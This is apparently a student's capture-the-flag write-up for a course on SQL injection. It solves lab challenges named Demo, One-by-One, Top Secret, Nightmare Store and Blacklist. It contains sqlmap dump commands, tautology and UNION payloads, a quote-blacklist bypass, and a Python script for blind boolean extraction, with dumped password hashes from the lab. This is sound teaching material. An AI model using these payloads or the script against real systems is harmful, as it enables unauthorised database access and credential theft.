# Course 4: SQL Injection

# Demo
Find the databases
```bash
sqlmap -u http://141.85.224.102:8083/ --forms --dbs

available databases [5]:
[*] demo
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

Find the tables
```bash
sqlmap -u http://141.85.224.102:8083/ --forms -D demo --tables

Database: demo
[2 tables]
+-------+
| flags |
| users |
+-------+
```

Look inside the flags table
```bash
sqlmap -u http://141.85.224.102:8083/ --forms -D demo -T flags --dump

Database: demo
Table: flags
[7 entries]
+---+---------------------+
| k | v                   |
+---+---------------------+
| 1 | not_so_ez           |
| 2 | not_so_ez           |
| 3 | not_so_ez           |
| 4 | not_so_ez           |
| 5 | not_so_ez           |
| 6 | not_so_ez           |
| 7 | SSS{mAsTeR_oF_sQlI} |
+---+---------------------+

SSS{mAsTeR_oF_sQlI}
```

# One-by-One
```bash
[20:00:20] [WARNING] GET parameter 'paymentMethod' does not seem to be injectable
```

```bash
sqlmap -u "http://141.85.224.102:8035" --forms --dbs

available databases [4]:
[*] flags
[*] information_schema
[*] mysql
[*] performance_schema
```

```bash
sqlmap -u "http://141.85.224.102:8035" --forms -D flags --tables

Database: flags
[1 table]
+-------+
| flags |
+-------+
```

```bash
sqlmap -u "http://141.85.224.102:8035/" --forms -D flags -t flags --dump 

Database: flags
Table: flags
[1 entry]
+----+--------------------------------------------------+
| id | flag                                             |
+----+--------------------------------------------------+
| 1  | SSS{d1d_y0u_really_g0t_th1s_0ne_by_0ne_H7N19xjW} |
+----+--------------------------------------------------+
```

SSS{d1d_y0u_really_g0t_th1s_0ne_by_0ne_H7N19xjW}

# Top Secret
We can add secrets and view them

If in the session id field we use 
```txt
' or 1=1; --
```

We can see all of the secrets on the website, for example
```html
<tr><td>  SSS{u1tr4_m3g4_t0p_s3cr3t}  </td></tr><tr><td></td></tr><tr><td></td></tr><tr><td></td></tr><tr><td>asas</td></tr><tr><td></td></tr><tr><td>aaaa</td></tr><tr><td>test</td></tr><tr><td>abc</td></tr><tr><td>test</td></tr><tr><td>' OR 1=1 --</td></tr><tr><td></td></tr><tr><td>'</td></tr><tr><td>test</td></tr><tr><td>test</td></tr><tr><td>a</td></tr><tr><td>test</td></tr><tr><td>a</td></tr><tr><td>test</td></tr><tr><td>a</td></tr><tr><td>a</td></tr><tr><td>2240</td></tr><tr><td>a((()&quot;'))((</td></tr><tr><td>a'HoIRTw&lt;'&quot;&gt;bpkeLC</td></tr><tr><td>a' AND 3904=2058-- KHlg</td></tr><tr><td>a' AND 3530=3530-- zZAz</td></tr><tr><td>a') AND 2584=7585 AND ('ptnv'='ptnv</td></tr><tr><td>a') AND 3530=3530 AND ('jFkG'='jFkG</td></tr><tr><td>a')) AND 7881=6393 AND (('bZeo'='bZeo</td></tr><tr><td>a')) AND 3530=3530 AND (('eusr'='eusr</td></tr><tr><td>a'))) AND 2374=5626 AND ((('NAHZ'='NAHZ</td></tr><tr><td>a'))) AND 3530=3530 AND ((('hoqi'='hoqi</td></tr><tr><td>a' AND 7758=7517 AND 'hOcd'='hOcd</td></tr><tr><td>a' AND 3530=3530 AND 'RRGg'='RRGg</td></tr><tr><td>a') AND 3199=2593 AND ('GwNJ' LIKE 'GwNJ</td></tr><tr><td>a') AND 3530=3530 AND ('vfEK' LIKE 'vfEK</td></tr><tr><td>a')) AND 5257=2637 AND (('UxZJ' LIKE 'UxZJ</td></tr><tr><td>a')) AND 3530=3530 AND (('QVkr' LIKE 'QVkr</td></tr><tr><td>a%' AND 5105=2486 AND 'JDdj%'='JDdj</td></tr><tr><td>a%' AND 3530=3530 AND 'jQeQ%'='jQeQ</td></tr><tr><td>a' AND 4659=1079 AND 'Rvhu' LIKE 'Rvhu</td></tr><tr><td>a' AND 3530=3530 AND 'YKUi' LIKE 'YKUi</td></tr><tr><td>a&quot;) AND 1892=3795 AND (&quot;tEZo&quot;=&quot;tEZo</td></tr><tr><td>a&quot;) AND 3530=3530 AND (&quot;aIYE&quot;=&quot;aIYE</td></tr><tr><td>a&quot;)) AND 2418=6533 AND ((&quot;yEvY&quot;=&quot;yEvY</td></tr><tr><td>a&quot;)) AND 3530=3530 AND ((&quot;UEay&quot;=&quot;UEay</td></tr><tr><td>a&quot; AND 7539=7999 AND &quot;dgCE&quot;=&quot;dgCE</td></tr><tr><td>a&quot; AND 3530=3530 AND &quot;fhMS&quot;=&quot;fhMS</td></tr><tr><td>a&quot;) AND 6781=1711 AND (&quot;FEJg&quot; LIKE &quot;FEJg</td></tr><tr><td>a&quot;) AND 3530=3530 AND (&quot;VYgC&quot; LIKE &quot;VYgC</td></tr><tr><td>a&quot; AND 1916=7304 AND &quot;ALgL&quot; LIKE &quot;ALgL</td></tr><tr><td>a&quot; AND 3530=3530 AND &quot;yOOi&quot; LIKE &quot;yOOi</td></tr><tr><td>a' AND 7982=6897 OR 'eVSK'='vXgB</td></tr><tr><td>a' AND 3530=3530 OR 'PGVH'='mNNA</td></tr><tr><td>a) AND 4288=2818-- iUWK</td></tr><tr><td>a) AND 3530=3530-- iuTC</td></tr><tr><td>a) AND 8363=7186 AND (3274=3274</td></tr><tr><td>a) AND 3530=3530 AND (5041=5041</td></tr><tr><td>a)) AND 4841=9015 AND ((2257=2257</td></tr><tr><td>a)) AND 3530=3530 AND ((9549=9549</td></tr><tr><td>a))) AND 9981=4638 AND (((3562=3562</td></tr><tr><td>a))) AND 3530=3530 AND (((4525=4525</td></tr><tr><td>a AND 3454=2607</td></tr><tr><td>a AND 3530=3530</td></tr><tr><td>a AND 5516=5126-- DTPq</td></tr><tr><td>a AND 3530=3530-- wnuK</td></tr><tr><td>a AND 6018=3917# XqUN</td></tr><tr><td>a AND 3530=3530# ySpZ</td></tr><tr><td>-8162</td></tr><tr><td>-4940' OR 8205=5094-- uPYp</td></tr><tr><td>-9699' OR 4341=4341-- cDhU</td></tr><tr><td>-8779') OR 7633=9218 AND ('DfDc'='DfDc</td></tr><tr><td>-3942') OR 4341=4341 AND ('eXQE'='eXQE</td></tr><tr><td>-8993')) OR 5551=5973 AND (('HQLG'='HQLG</td></tr><tr><td>-6771')) OR 4341=4341 AND (('vOGE'='vOGE</td></tr><tr><td>-6445')) OR 6569=6571 AND (('MTex'='MTex</td></
```

```txt
SSS{u1tr4_m3g4_t0p_s3cr3t}
```

# Nightmare Store
We can search for items, using 
```sql
' or 1=1; -- --
```

The request for an item looks like
```http
GET /api/v1.0/storeAPI/item HTTP/1.1
Host: 141.85.224.102:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://141.85.224.102:8081/login
Cookie: PHPSESSID=a451699b11b3eace0b48f3801481094f
Priority: u=0
```

We find water, juice, candy

The login looks like 
```http
POST /login HTTP/1.1
Host: 141.85.224.102:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://141.85.224.102:8081
Connection: keep-alive
Referer: http://141.85.224.102:8081/login
Cookie: PHPSESSID=a451699b11b3eace0b48f3801481094f
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&password=pass
```

I can use admin' or 1=1; -- -- as username, but that does not seem to provide useful data
```html
   <h2> Personal Info.</h2>
    Name : Not found<br>
    DOB : Not found<br>
    Address : Not found<br>

    <h2> Site Info.</h2>
    Publisher : DBlueFoundations<br>
    Address : setASCII<br>
    Database Type: sqlite<br>
        
```

Using ' ORDER BY 3 -- -- results in a error 500, which shows the table has only 2 columns


Found a Boolean based injection

This is what it returns for a true payload
```sql
' or 1=1 and 1=1; -- --
```
```http
HTTP/1.1 200 OK
Server: nginx/1.23.2
Date: Thu, 02 Jul 2026 17:43:36 GMT
Content-Type: application/json
Content-Length: 143
Connection: keep-alive

[{"name":"water","price":"100","quantity":"40"},{"name":"juice","price":"110","quantity":"40"},{"name":"candy","price":"10","quantity":"100"}]
```

And this is for a false one
```txt

' or 1=1 and 1=2; -- --
```

```http
HTTP/1.1 200 OK
Server: nginx/1.23.2
Date: Thu, 02 Jul 2026 17:45:09 GMT
Content-Type: application/json
Content-Length: 3
Connection: keep-alive

[]

```

So I made a python script using chatgpt
```python 
#!/usr/bin/env python3

import requests
import string

URL = "http://141.85.224.102:8081/api/v1.0/storeAPI/"

# Change if needed
MAX_LEN = 500

# Success == returns the 3 store items
def query(condition):
    payload = f"' or ({condition}); -- --"

    r = requests.get(URL + requests.utils.quote(payload, safe=''))

    return '"water"' in r.text


def extract(expr):
    out = ""

    for pos in range(1, MAX_LEN + 1):
        found = False

        for c in string.printable:
            ascii_code = ord(c)

            cond = f"unicode(substr(({expr}),{pos},1))={ascii_code}"

            if query(cond):
                out += c
                print(out)
                found = True
                break

        if not found:
            break

    return out


expr = input("SQL> ")
print(extract(expr))

'''
Example usage + output

SQL> select sqlite_version()

SQL> select group_concat(name,',') from sqlite_master where type='table'
shop_items,shop_items_old,employees,

check807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87
checkf8dad5559eb331eaa32929379eaaf25d2afd5b6eabee7926d1b33c6a7b76fc9d
check849fb3d286b87c91b78e81ba09c4be829044e8bae2975008887740488b68c8f7

SQL> select sql from sqlite_master where name='employees'
CREATE TABLE employees(username TEXT, password TEXT)

SQL> select group_concat(name,',') from pragma_table_info('employees')
username,password

SQL> select group_concat(username,',') from employees
ram,shyam,ghanshyam

SQL> select group_concat(password,',') from employees
b4964b10bffb7a355718872d9f26693d,dbbf5a3c888e194e7047bdb4af94b305,f036db6de053e761543609c99370efff
'''
```

Tried multiple things, finding thw usernames and logging in the hopes of becoming an admin, looking at the old shop items, the thing that worked was looking in the long table
```python

'''
SQL> select group_concat(name,',') from pragma_table_info('check807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87')
here_man,secret

SQL> select group_concat(here_man,',') from check807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87
SSS{tea_is_the_answear}
'''
```

# Blacklist
The website bans ' and "

The trick was to add #\ at the end of the query

Finding table names
```
UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = database() #\
1
3

search_engine
1
3

users
```

0x7573657273 = raw bytes of 'users'

Finding column names
```
UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name = 0x7573657273 #\
1
3

username
1
3

password
1
3

USER
1
3

CURRENT_CONNECTIONS
1
3

TOTAL_CONNECTIONS

```

Getting the flag
```
union select 1, username, password from users #\

1
SSS{draco_dormiens_nunquam_titillandus}

Administrator
```
